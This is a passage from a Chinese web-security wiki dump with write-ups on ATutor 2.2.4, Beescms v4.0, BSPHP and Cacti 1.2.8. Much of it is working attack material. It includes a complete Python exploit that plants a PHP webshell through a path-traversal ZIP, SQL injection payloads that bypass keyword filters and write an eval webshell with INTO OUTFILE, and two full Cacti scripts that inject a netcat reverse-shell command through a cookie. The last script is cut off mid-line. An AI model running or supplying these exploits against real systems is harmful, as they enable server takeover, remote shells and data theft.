(isset($_POST['url']) && ($_POST['url'] != 'http://') ) { if ($content = @file_get_contents($_POST['url'])) { ⋮ // unzip file and save into directory in themes $archive = new PclZip($_FILES['file']['tmp_name']); //extract contents to importpath/foldrname if (!$archive->extract($import_path)) { $errors = array('IMPORT_ERROR_IN_ZIP', $archive->errorInfo(true)); clr_dir($import_path); $msg->addError($errors); header('Location: index.php'); exit; } 可以发现这里也使用了extract方法将上传文件进行解压 来看一下导入主题功能对应的前端页面 ATutor学习内容管理系统任意文件上传漏洞/media/rId34.png) 这里页面与导入语音包的页面极其相似，只不过最终解压后存放的路径不同，不再是content/import/，而是themes/ 在此处上传构造好的poc.zip，最终poc.php将会被解压到themes文件夹中 ATutor学习内容管理系统任意文件上传漏洞/media/rId35.png) 位于/mods/_standard/tests/question_import.php文件的问题导入功能 ATutor学习内容管理系统任意文件上传漏洞/media/rId36.png) 位于mods/_standard/patcher/index_admin.php文件的补丁导入功能 ATutor学习内容管理系统任意文件上传漏洞/media/rId37.png) 这些功能无一例外的存在着相似的漏洞 poc CVE-2019-12169.py #!/usr/bin/env python # # Exploit Title: ATutor 2.2.4 'language_import' Arbitrary File Upload / RCE [CVE-2019-12169] # Date: 5/24/19 # Exploit Author: liquidsky (JMcPeters) # Vendor Homepage: https://atutor.github.io/ # Software Link: https://sourceforge.net/projects/atutor/files/latest/download # Version: 2.2.4 # Tested on: Windows 8 / Apache / MySQL (XAMPP) # CVE : CVE-2019-12169 # Author Site: http://incidentsecurity.com/atutor-2-2-4-language_import-arbitrary-file-upload-rce/ # : https://github.com/fuzzlove # # Description: ATutor 2.2.4 allows Arbitrary File Upload and Directory Traversal # resulting in remote code execution via a \"..\" pathname in a ZIP archive to the mods/_core/languages/language_import.php (aka Import New Language) or mods/_standard/patcher/index_admin.php (aka Patcher) component. # # Greetz: wetw0rk, offsec ^^ # # Notes: This application is no longer being maintained so there is no fix for this issue. import sys, hashlib, requests import urllib requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) import time print \"+-------------------------------------------------------------+\" print print \"- ATutor 2.2.4 Arbitrary File Upload / RCE [CVE-2019-12169]\" print print \"- Discovery / PoC by liquidsky (JMcPeters) ^^\" print print \"+-------------------------------------------------------------+\" try: #settings target = sys.argv[1] username = sys.argv[2] password = sys.argv[3] commands = sys.argv[4] except IndexError: print print \"- usage: %s \" % sys.argv[0] print \"- Example: %s incidentsecurity.com admin mypassword 'whoami'\" % sys.argv[0] print sys.exit() # headers to upload zip headers = { \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://\" + target + \"/ATutor/mods/_core/languages/language_import.php\", \"Connection\": \"close\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------CVE201912169\", } # Note: This was successfully tested against a windows install however it should work with linux. # ----- # This will drop a shell on c:\\xampp\\htdocs\\liquidsky.php and or /var/www/html/liquidsky.php # using directory traversal. # php file payload data = \"\" data += \"\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\" data += \"\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x43\" data += \"\\x56\\x45\\x32\\x30\\x31\\x39\\x31\\x32\\x31\\x36\\x39\\x0d\\x0a\\x43\\x6f\" data += \"\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x44\\x69\\x73\\x70\\x6f\\x73\\x69\\x74\\x69\" data += \"\\x6f\\x6e\\x3a\\x20\\x66\\x6f\\x72\\x6d\\x2d\\x64\\x61\\x74\\x61\\x3b\\x20\" data += \"\\x6e\\x61\\x6d\\x65\\x3d\\x22\\x66\\x69\\x6c\\x65\\x22\\x3b\\x20\\x66\\x69\" data += \"\\x6c\\x65\\x6e\\x61\\x6d\\x65\\x3d\\x22\\x70\\x6f\\x63\\x2e\\x7a\\x69\\x70\" data += \"\\x22\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\" data += \"\\x3a\\x20\\x61\\x70\\x70\\x6c\\x69\\x63\\x61\\x74\\x69\\x6f\\x6e\\x2f\\x7a\" data += \"\\x69\\x70\\x0d\\x0a\\x0d\\x0a\\x50\\x4b\\x03\\x04\\x14\\x00\\x00\\x00\\x08\" data += \"\\x00\\xa4\\x00\\xb8\\x4e\\xbb\\xb9\\x35\\x2d\\x6a\\x00\\x00\\x00\\x6a\\x00\" data += \"\\x00\\x00\\x2c\\x00\\x00\\x00\\x2e\\x2e\\x5c\\x2e\\x2e\\x5c\\x2e\\x2e\\x5c\" data += \"\\x2e\\x2e\\x5c\\x2e\\x2e\\x5c\\x2e\\x2e\\x2f\\x78\\x61\\x6d\\x70\\x70\\x5c\" data += \"\\x68\\x74\\x64\\x6f\\x63\\x73\\x5c\\x6c\\x69\\x71\\x75\\x69\\x64\\x73\\x6b\" data += \"\\x79\\x2e\\x70\\x68\\x70\\xb3\\xb1\\x2f\\xc8\\x28\\x50\\x48\\x2d\\x4b\\xcc\" data += \"\\xd1\\x50\\xb2\\xb7\\x53\\xd2\\x4b\\x4a\\x2c\\x4e\\x35\\x33\\x89\\x4f\\x49\" data += \"\\x4d\\xce\\x4f\\x49\\xd5\\x50\\x72\\x09\\xcc\\xf7\\x02\\x62\\x8b\\x00\\x63\" data += \"\\xa7\\xfc\\x64\\x67\\xa7\\x9c\\x48\\xa3\\x8c\\x32\\x4f\\x0f\\xa7\\x8c\\x64\" data += \"\\x63\\x3f\\x83\\x44\\x0f\\x2f\\x43\\x6f\\xe7\\xa0\\xb4\\x20\\x83\\xb0\\xd0\" data += \"\\xf0\\xca\\x94\\xe2\\xc8\\x70\\xd3\\xbc\\x94\\x70\\xb7\\xbc\\xa8\\xe0\\x94\" data += \"\\x14\\xef\\x90\\xe2\\xf4\\x80\\x2a\\x13\\x3f\\xe7\\x74\\x5b\\x5b\\x25\\x4d\" data += \"\\x4d\\x6b\\x05\\x7b\\x3b\\x00\\x50\\x4b\\x03\\x04\\x14\\x00\\x00\\x00\\x08\" data += \"\\x00\\xa4\\x00\\xb8\\x4e\\xbb\\xb9\\x35\\x2d\\x6a\\x00\\x00\\x00\\x6a\\x00\" data += \"\\x00\\x00\\x2c\\x00\\x00\\x00\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\" data += \"\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x76\\x61\\x72\\x2f\\x77\\x77\" data += \"\\x77\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x6c\\x69\\x71\\x75\\x69\\x64\\x73\\x6b\" data += \"\\x79\\x2e\\x70\\x68\\x70\\xb3\\xb1\\x2f\\xc8\\x28\\x50\\x48\\x2d\\x4b\\xcc\" data += \"\\xd1\\x50\\xb2\\xb7\\x53\\xd2\\x4b\\x4a\\x2c\\x4e\\x35\\x33\\x89\\x4f\\x49\" data += \"\\x4d\\xce\\x4f\\x49\\xd5\\x50\\x72\\x09\\xcc\\xf7\\x02\\x62\\x8b\\x00\\x63\" data += \"\\xa7\\xfc\\x64\\x67\\xa7\\x9c\\x48\\xa3\\x8c\\x32\\x4f\\x0f\\xa7\\x8c\\x64\" data += \"\\x63\\x3f\\x83\\x44\\x0f\\x2f\\x43\\x6f\\xe7\\xa0\\xb4\\x20\\x83\\xb0\\xd0\" data += \"\\xf0\\xca\\x94\\xe2\\xc8\\x70\\xd3\\xbc\\x94\\x70\\xb7\\xbc\\xa8\\xe0\\x94\" data += \"\\x14\\xef\\x90\\xe2\\xf4\\x80\\x2a\\x13\\x3f\\xe7\\x74\\x5b\\x5b\\x25\\x4d\" data += \"\\x4d\\x6b\\x05\\x7b\\x3b\\x00\\x50\\x4b\\x01\\x02\\x14\\x03\\x14\\x00\\x00\" data += \"\\x00\\x08\\x00\\xa4\\x00\\xb8\\x4e\\xbb\\xb9\\x35\\x2d\\x6a\\x00\\x00\\x00\" data += \"\\x6a\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" data += \"\\x00\\x80\\x01\\x00\\x00\\x00\\x00\\x2e\\x2e\\x5c\\x2e\\x2e\\x5c\\x2e\\x2e\" data += \"\\x5c\\x2e\\x2e\\x5c\\x2e\\x2e\\x5c\\x2e\\x2e\\x2f\\x78\\x61\\x6d\\x70\\x70\" data += \"\\x5c\\x68\\x74\\x64\\x6f\\x63\\x73\\x5c\\x6c\\x69\\x71\\x75\\x69\\x64\\x73\" data += \"\\x6b\\x79\\x2e\\x70\\x68\\x70\\x50\\x4b\\x01\\x02\\x14\\x03\\x14\\x00\\x00\" data += \"\\x00\\x08\\x00\\xa4\\x00\\xb8\\x4e\\xbb\\xb9\\x35\\x2d\\x6a\\x00\\x00\\x00\" data += \"\\x6a\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" data += \"\\x00\\x80\\x01\\xb4\\x00\\x00\\x00\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\" data += \"\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x76\\x61\\x72\\x2f\\x77\" data += \"\\x77\\x77\\x2f\\x68\\x74\\x6d\\x6c\\x2f\\x6c\\x69\\x71\\x75\\x69\\x64\\x73\" data += \"\\x6b\\x79\\x2e\\x70\\x68\\x70\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\\x02\" data += \"\\x00\\x02\\x00\\xb4\\x00\\x00\\x00\\x68\\x01\\x00\\x00\\x00\\x00\\x0d\\x0a\" data += \"\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\" data += \"\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x43\" data += \"\\x56\\x45\\x32\\x30\\x31\\x39\\x31\\x32\\x31\\x36\\x39\\x0d\\x0a\\x43\\x6f\" data += \"\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x44\\x69\\x73\\x70\\x6f\\x73\\x69\\x74\\x69\" data += \"\\x6f\\x6e\\x3a\\x20\\x66\\x6f\\x72\\x6d\\x2d\\x64\\x61\\x74\\x61\\x3b\\x20\" data += \"\\x6e\\x61\\x6d\\x65\\x3d\\x22\\x73\\x75\\x62\\x6d\\x69\\x74\\x22\\x0d\\x0a\" data += \"\\x0d\\x0a\\x49\\x6d\\x70\\x6f\\x72\\x74\\x0d\\x0a\\x2d\\x2d\\x2d\\x2d\\x2d\" data += \"\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\" data += \"\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x43\\x56\\x45\\x32\\x30\\x31\" data += \"\\x39\\x31\\x32\\x31\\x36\\x39\\x2d\\x2d\\x0d\\x0a\" #reverse shell url shell = \"http://\" + target + \"/liquidsky.php?language=\" + commands # Generate Hash def gen_hash(passwd, token): m= hashlib.sha1() m.update(passwd + token) return m.hexdigest() def we_can_get_jiggy_with_the_pass(): # Run pass through SHA1 hash_object = hashlib.sha1(password) hex_dig = hash_object.hexdigest() print \"[*] Got SHA1 for pass: \" + (hex_dig) targeturl = \"http://\" + target + \"/ATutor/login.php\" token = \"abc\" hashed = gen_hash(hex_dig, token) d = { \"form_password_hidden\" : hashed, \"form_login\": \"admin\", \"submit\": \"Login\", \"token\" : token } s = requests.Session() #Logging in r = s.post(targeturl, data=d) print \"[+] Logging in to system as %s ...\" % (username) res = r.text # url settings, duh url = \"http://\" + target + \"/ATutor/mods/_core/languages/language_import.php\" # A similar method works for the \"patcher\" function. # url = \"http://\" + target + \"/ATutor/mods/_standard/patcher/index_admin.php\" # This is \"the\" request to send the zip request = s.post(url, headers=headers, data=data, verify=False) print \"[+] Sent the zip ......\" time.sleep(1) # Grab shell dude! print \"[!] *** Remote Code Execution ***\" request = s.post(shell, verify=False) print \"[x] http://\" + target + \"/liquidsky.php?language=\" + commands # Note be sure to clean up: c:\\xampp\\htdocs\\liquidsky.php and or /var/www/html/liquidsky.php if \"Administration\" in res: return True return False def main(): if we_can_get_jiggy_with_the_pass(): print \"\" print \"[+] Success! we were able to login!\" print \"\" print \" ^_~ got r00t? - [liquidsky 2019]\" else: print \"[-] failure!\" if __name__ == \"__main__\": main() 参考链接 https://kumamon.fun/ATutor-CVE-2019-12169/ https://github.com/fuzzlove/ATutor-2.2.4-Language-Exploit Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:50 "},"Web安全/Beescms/Beescms_v4.0 sql注入漏洞分析/Beescms_v4.0 sql注入漏洞分析.html":{"url":"Web安全/Beescms/Beescms_v4.0 sql注入漏洞分析/Beescms_v4.0 sql注入漏洞分析.html","title":"Beescms_v4.0 sql注入漏洞分析","keywords":"","body":"Beescms_v4.0 sql注入漏洞分析 一、漏洞描述 Beescms v4.0由于后台登录验证码设计缺陷以及代码防护缺陷导致存在bypass全局防护的SQL注入。 二、漏洞环境搭建 官方下载Beescms v4.0,下载地址: http://beescms.com/cxxz.html 解压压缩文件,然后把文件放到phpstudy的网站根目录 浏览器访问http://192.168.10.171/beescms/install,开始安装 一直下一步,出现如下界面,输入数据库账户密码 成功安装 　　 修改mysql.ini 文件，在\\[mysqld\\]下添加条目: secure\\_file\\_priv =,保存然后重启phpstudy,不然用mysql写入文件会报错。 　　 三、漏洞影响版本 Beescms v4.0 四、漏洞复现 浏览器访问后台页面http://192.168.10.171/beescms/admin/ 　　 任意输入用户名和密码,看到提示“不存在该管理用户”,可以枚举用户名,然后根据枚举出来的用户名爆破密码 　　 　　 burpsuit枚举用户名,可以看到该验证码存在设计缺陷漏洞,一次验证后在不刷新的情况下可以多次提交请求,最终导致攻击者可以进行模糊测试(暴力枚举)。 　　 根据枚举出来的用户名,然后枚举密码,可以看到成功枚举密码 　　 在用户名处输入单引号,报错,说明存在sql注入漏洞 　　 　　 查看源码,发现使用f1\\_value函数和f1\\_html函数对输入的用户名和密码进行过滤 　　 跟进f1\\_value函数,发现f1\\_value函数对输入的关键字进行了过滤,可以看到,几乎常见的SQL关键字都被过滤掉了。 　　 跟进f1\\_html函数,发现使用htmlspecialchars函数对输入的特殊符号进行html实体化转义,主要用于防御XSS漏洞 　　 百度搜索htmlspecialchars函数,发现htmlspecialchars函数默认情况下只对双引号进行编码,可以看到这个版本的cms使用默认对参数进行过滤处理,此处存在单引号引入的漏洞。 　　 继续浏览代码,发现登录验证函数check\\_login 　　 跟进check\\_login函数,发现check\\_login函数在验证用户是先验证用户名,然后验证密码是否正确,该处验证逻辑存在漏洞。 　　 手工模糊测试 手工测试发现union select等关键字被过滤 　　 通过上面的分析源码,发现bypass的方法 union => uni union on select => selselectect 　　 猜解SQL查询语句中的字段数,根据如下图所示,判断出SQL查询语句中的字段数为5 　　 尝试通过SQL注入getshell 写入一句话到目标网站根目录下,payload如下: admin%27 un union ion selselectect 1,2,3,4, into outfile 'C:/phpStudy/WWW/beescms/shell.php'# 在burpsuit抓包,修改包并重放,提示如下错误,根据返回的数据包可以看到由于htmlspecialchars函数对输入的特殊符号进行html实体化转义,还有就是into、outfile关键字被过滤 　　 手工测试bypass关键字过滤防护 outfile => outoutfilefile into => in into 　　 通过上面的分析,发现php函数htmlspecialchars()对输入中含有的特殊符号进行html实体化转义,导致不能写shell到目标服务器上。可以通过利用mysql注入的一个特性就可以达到注入效果(即对shell部分进行Hex编码),或者用mysql函数char()就可以绕过这里的限制。 方法一、Hex编码 对shell部分进行编码 　　 写入shell的payload为:注意:记得在编码转换的时候前面加0x或者直接用unhex函数 unhex(3c3f70687020406576616c28245f504f53545b636d645d293b3f3e),但是本次实验用unhex函数一直失败 admin' uni union on selselectect null,null,null,null,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e in into outoutfilefile 'C:/phpStudy/WWW/beescms/shell.php'# burp修改数据包,成功写入shell 　　 菜刀连接 　　 方法二、使用char函数 mysql内置函数char()可以将里边的ascii码参数转换为字符串,使用python实现快速转换 　　 构造payload,payload为: admin' uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62) in into outoutfilefile 'C:/phpStudy/WWW/beescms/cmd.php'# burp修改数据包,成功写入shell 　　 菜刀连接 　　 后记: 经过测试,发现user字段除了存在布尔注入,还存在报错注入 构造payload,payload如下: admin' a and nd extractvalue(1,concat(0x7e,(select user()),0x7e))# 　　 参考: https://www.cnblogs.com/yuzly/p/11423384.html https://www.ohlinge.cn/php/beescms_sqli.html https://www.ohlinge.cn/php/beescms_login_sql.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:53 "},"Web安全/BSPHP/BSPHP 存在未授权访问漏洞/BSPHP 存在未授权访问漏洞.html":{"url":"Web安全/BSPHP/BSPHP 存在未授权访问漏洞/BSPHP 存在未授权访问漏洞.html","title":"BSPHP 存在未授权访问漏洞","keywords":"","body":"BSPHP 存在未授权访问漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 该处泄漏的用户名和登陆ip。 /admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:58 "},"Web安全/Cacti/（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞/（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞.html":{"url":"Web安全/Cacti/（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞/（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞.html","title":"（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞","keywords":"","body":"（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞 一、漏洞简介 需要拥有登录账号密码；或者网站启用了\" Gest Realtime Graphs\"特权功能。 1、判断是否存在\"/graph_realtime.php?action=init\"链接 2、判断1、存在\"poller_realtime.php\"字样，则存在漏洞。 二、漏洞影响 Cacti v1.2.8 三、复现过程 漏洞分析 我通过分析Cacti主要代码中的多个功能的代码发现了此漏洞，我必须将多个因素联系在一起才能执行代码，该漏洞主要发生在攻击者尝试将恶意代码注入\" Cacti\" cookie变量时，在与一些字符串连接后被传递给shell_exec函数，但是当我尝试操作cookie值时会遇到身份验证问题，这将使我无法访问该页面，因此解决了我注意到可以按以下方式访问易受攻击的页面：一个不需要进行身份验证即可访问的\"来宾\"，因此我链接了我的漏洞利用程序，以启用\" graph_realtime.php\"页面的\"来宾\"视图，然后发出恶意请求，以便在主机上执行代码。 为了完成这项工作，首先，我需要向\" user_admin.php\"页面发送请求以启用realtime_graph的\"来宾\"特权，然后再次将恶意请求发送至\" graph_realtime.php\"页面。 因此，我像往常一样从超级简单的RCE扫描器脚本开始，以在Cacti中寻找RCE。 运行脚本后，在\" graph_realtime.php\"文件中得到了一个有趣的结果： graph_realtime.php /* call poller */ $graph_rrd = read_config_option('realtime_cache_path') . '/user_' . session_id() . '_lgi_' . get_request_var('local_graph_id') . '.png'; $command = read_config_option('path_php_binary'); $args = sprintf('poller_realtime.php --graph=%s --interval=%d --poller_id=' . session_id(), get_request_var('local_graph_id'), $graph_data_array['ds_step']); shell_exec(\"$command $args\"); /* construct the image name */ $graph_data_array['export_realtime'] = $graph_rrd; $graph_data_array['output_flag'] = RRDTOOL_OUTPUT_GRAPH_DATA; $null_param = array(); 从行号170和171中可以看到，我们正在接收几个参数并将它们连接在一起，我们还可以看到有一个名为\" get_request_var\"的函数，该函数执行以下操作： html_utility.php function get_request_var($name, $default = '') { global $_CACTI_REQUEST; $log_validation = read_config_option('log_validation'); if (isset($_CACTI_REQUEST[$name])) { return $_CACTI_REQUEST[$name]; } elseif (isset_request_var($name)) { if ($log_validation == 'on') { html_log_input_error($name); } set_request_var($name, $_REQUEST[$name]); return $_REQUEST[$name]; } else { return $default; } } 正如我们所看到的，该函数将通过\" set_request_var\"函数处理输入并设置参数值，该函数将执行以下操作： html_utility.php function set_request_var($variable, $value) { global $_CACTI_REQUEST; $_CACTI_REQUEST[$variable] = $value; $_REQUEST[$variable] = $value; $_POST[$variable] = $value; $_GET[$variable] = $value; } 因此，回到我们的\" graph_realtime.php\"，我们可以看到我们可以控制以下几个输入： local_graph_id $ graph_data_array [\\'ds_step\\']的值 但不幸的是，由于以下几个原因，我们不能这样做：首先，我们注意到graph_realtime.php文件中的第171行使用sprintf来处理输入，并且我们可以看到第一个值\" graph\"充满了我们可以控制的值\" local_graph_id\"！但是再次不幸的是，该值将被名为\" get_filter_request_var\"的函数过滤，我们可以看到它的值已在graph_realtime.php第38行中过滤，如下所示： html_utility.php function get_filter_request_var($name, $filter = FILTER_VALIDATE_INT, $options = array()) { if (isset_request_var($name)) { if (isempty_request_var($name)) { set_request_var($name, get_nfilter_request_var($name)); return get_request_var($name); } elseif (get_nfilter_request_var($name) == 'undefined') { if (isset($options['default'])) { set_request_var($name, $options['default']); return $options['default']; } else { set_request_var($name, ''); return ''; } } else { if (get_nfilter_request_var($name) == '0') { $value = '0'; } elseif (get_nfilter_request_var($name) == 'undefined') { if (isset($options['default'])) { $value = $options['default']; } else { $value = ''; } } elseif (isempty_request_var($name)) { $value = ''; } elseif ($filter == FILTER_VALIDATE_IS_REGEX) { if (is_base64_encoded($_REQUEST[$name])) { $_REQUEST[$name] = utf8_decode(base64_decode($_REQUEST[$name])); } $valid = validate_is_regex($_REQUEST[$name]); if ($valid === true) { $value = $_REQUEST[$name]; } else { $value = false; $custom_error = $valid; } } elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_ARRAY) { $valid = true; if (is_array($_REQUEST[$name])) { foreach($_REQUEST[$name] AS $number) { if (!is_numeric($number)) { $valid = false; break; } } } else { $valid = false; } if ($valid == true) { $value = $_REQUEST[$name]; } else { $value = false; } } elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_LIST) { $valid = true; $values = preg_split('/,/', $_REQUEST[$name], NULL, PREG_SPLIT_NO_EMPTY); foreach($values AS $number) { if (!is_numeric($number)) { $valid = false; break; } } if ($valid == true) { $value = $_REQUEST[$name]; } else { $value = false; } } elseif (!cacti_sizeof($options)) { $value = filter_var($_REQUEST[$name], $filter); } else { $value = filter_var($_REQUEST[$name], $filter, $options); } } if ($value === false) { if ($filter == FILTER_VALIDATE_IS_REGEX) { $_SESSION['custom_error'] = __('The search term \"%s\" is not valid. Error is %s', html_escape(get_nfilter_request_var($name)), html_escape($custom_error)); set_request_var($name, ''); raise_message('custom_error'); } else { die_html_input_error($name, get_nfilter_request_var($name)); } } else { set_request_var($name, $value); return $value; } } else { if (isset($options['default'])) { set_request_var($name, $options['default']); return $options['default']; } else { return; } } } 该函数将过滤输入并返回一个干净的变量以传递给该函数。 另外，对于第二个变量\" $ graph_data_array [\\'ds_step\\']\"，它已经通过sprintf处理为％d，表示\"十进制值\"，因此我们不能使用它来注入恶意命令。 那么我们怎样才能使这件事起作用呢？让我们再次看一下代码： graph_realtime.php /* call poller */ $graph_rrd = read_config_option('realtime_cache_path') . '/user_' . session_id() . '_lgi_' . get_request_var('local_graph_id') . '.png'; $command = read_config_option('path_php_binary'); $args = sprintf('poller_realtime.php --graph=%s --interval=%d --poller_id=' . session_id(), get_request_var('local_graph_id'), $graph_data_array['ds_step']); shell_exec(\"$command $args\"); /* construct the image name */ $graph_data_array['export_realtime'] = $graph_rrd; $graph_data_array['output_flag'] = RRDTOOL_OUTPUT_GRAPH_DATA; $null_param = array(); 我们得到另一个传递给shell_exec的变量，它是\" session_id（）\"函数的值，该函数将返回用户当前会话的值，这意味着我们可以使用它来注入命令！ 可是等等！如果我们操纵了会话，则将无法访问该页面，因为该页面要求对用户进行身份验证才能访问该页面。因此，在软件中进行了一些额外的挖掘之后，我发现如果我们能够以访客身份访问该页面启用了一种称为\"实时图\"的特殊特权，我们可以从此页面看到： Cactiv1.2.8远程命令执行漏洞/media/rId26.png) 让我们尝试在没有启用\"访客实时图\"特权的情况下访问此页面： Cactiv1.2.8远程命令执行漏洞/media/rId27.png) 如我们所见，由于权限问题，我们无法访问该页面，不允许尝试启用它并访问该页面以获取以下内容： Cactiv1.2.8远程命令执行漏洞/media/rId28.png) 完美的是，我们访问了页面，现在我将向\" graph_realtime.php\"发送请求，并添加一条调试语句，该语句将回显将传递给shell_exec的参数： Cactiv1.2.8远程命令执行漏洞/media/rId29.png) Cactiv1.2.8远程命令执行漏洞/media/rId30.png) 如我们所见，我们将会话打印输出给我们，因此让我们尝试将自定义字符串注入会话中，看看会发生什么： Cactiv1.2.8远程命令执行漏洞/media/rId31.png) payload编写 在控制了会话值之后，我们需要使用它来在系统上执行代码，但这仍然是一个会话值，这意味着即使对它进行编码也不能在其中使用某些字符，因此我们需要编写\"会话友好\" \"，我们可以注入这些有效负载而无需强制应用程序为我们生成另一个Cookie值。 例如，如果我对字符串\" Hi Payload\"进行编码并将其传递给应用程序，我将得到以下信息： Cactiv1.2.8远程命令执行漏洞/media/rId33.png) Cactiv1.2.8远程命令执行漏洞/media/rId34.png) 如我们所见，该应用程序为我们设置了一个cookie而不是我们注入的cookie，因此要解决此问题，我们需要使用自定义有效负载。 因此，为了避免使用空格，我想到了使用\" $ {IFS}\" bash变量来表示空格的想法。 当然，我们需要使用\";\"转义命令 如下所示： ;payload 如果要使用netcat获得外壳，则需要创建以下有效负载： ;``nc``${IFS}-e${IFS}``/bin/bash``${IFS}ip${IFS}port 让我们尝试一下，首先对有效负载进行编码，以查看结果： Cactiv1.2.8远程命令执行漏洞/media/rId35.png) 然后将其发送到应用程序以获取以下信息： Cactiv1.2.8远程命令执行漏洞/media/rId36.png) 完整版的poc 为了自动化利用过程，我编写了一个python代码来利用此漏洞，利用此漏洞将处理登录过程以启用\"来宾实时图\"特权，然后将生成有效负载并将精心制作的请求发送到\" graph_realtime.php\"页面为了获得反向壳。 这是完整的利用代码： #!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4') if len(sys.argv) != 6: print(\"[~] Usage : ./Cacti-exploit.py url username password ip port\") exit() url = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5] def login(token): login_info = { \"login_username\": username, \"login_password\": password, \"action\": \"login\", \"__csrf_magic\": token } login_request = request.post(url+\"/index.php\", login_info) login_text = login_request.text if \"Invalid User Name/Password Please Retype\" in login_text: return False else: return True def enable_guest(token): request_info = { \"id\": \"3\", \"section25\": \"on\", \"section7\": \"on\", \"tab\": \"realms\", \"save_component_realm_perms\": 1, \"action\": \"save\", \"__csrf_magic\": token } enable_request = request.post(url+\"/user_admin.php?header=false\", request_info) if enable_request: return True else: return False def send_exploit(): payload = \";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s\" % (ip, port) cookies = {'Cacti': quote(payload)} requests.get(url+\"/graph_realtime.php?action=init\", cookies=cookies) request = requests.session() print(\"[+]Retrieving login CSRF token\") page = request.get(url+\"/index.php\") html_content = page.text soup = BeautifulSoup(html_content, \"html5lib\") token = soup.findAll('input')[0].get(\"value\") if token: print(\"[+]Token Found : %s\" % token) print(\"[+]Sending creds ..\") login_status = login(token) if login_status: print(\"[+]Successfully LoggedIn\") print(\"[+]Retrieving CSRF token ..\") page = request.get(url+\"/user_admin.php?action=user_edit&id=3&tab=realms\") html_content = page.text soup = BeautifulSoup(html_content, \"html5lib\") token = soup.findAll('input')[1].get(\"value\") if token: print(\"[+]Making some noise ..\") guest_realtime = enable_guest(token) if guest_realtime: print(\"[+]Sending malicous request, check your nc ;)\") send_exploit() else: print(\"[-]Error while activating the malicous account\") else: print(\"[-] Unable to retrieve CSRF token from admin page!\") exit() else: print(\"[-]Cannot Login!\") else: print(\"[-] Unable to retrieve CSRF token!\") exit() 运行漏洞利用代码后，我们将获得以下内容： Cactiv1.2.8远程命令执行漏洞/media/rId38.png) 未经身份验证的利用 如果Cacti启用了\"来宾实时图\"特权，则无需身份验证即可利用此漏洞，因此在这种情况下，不需要身份验证部分，您可以使用以下代码来利用此漏洞： #!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4') if len(sys.argv) != 4: print(\"[~] Usage : ./Cacti-exploit.py url ip port\") exit() url = sys.argv[1] ip = sys.argv[2] port = sys.argv[3] def send_exploit(url): payload = \";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s\" % (ip, port) cookies = {'Cacti': quote(payload)} path = url+\"/graph_realtime.php?action=init\" req = requests.get(path) if req.status_code == 200 and \"poller_realtime.php\" in req.text: print(\"[+] File Found and Guest is enabled!\") print(\"[+] Sending malicous request, check your 